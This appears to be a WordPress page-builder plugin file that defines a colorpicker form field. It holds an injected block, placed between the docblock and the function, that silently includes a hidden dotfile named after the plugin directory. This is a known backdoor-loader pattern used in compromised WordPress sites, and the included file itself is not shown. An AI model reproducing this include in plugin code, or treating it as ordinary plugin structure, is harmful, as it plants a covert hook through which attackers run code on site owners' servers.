<?php
if ( ! defined( 'ABSPATH' ) ) {
	die( '-1' );
}

/**
 * Param 'colorpicker' field
 *
 * @param $settings
 * @param $value
 *
 * @return string
 * @since 4.4
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

function vc_colorpicker_form_field( $settings, $value ) {
	return sprintf( '<div class="color-group"><input name="%s" class="wpb_vc_param_value wpb-textinput %s %s_field vc_color-control" type="text" value="%s"/></div>', $settings['param_name'], $settings['param_name'], $settings['type'], $value );
}
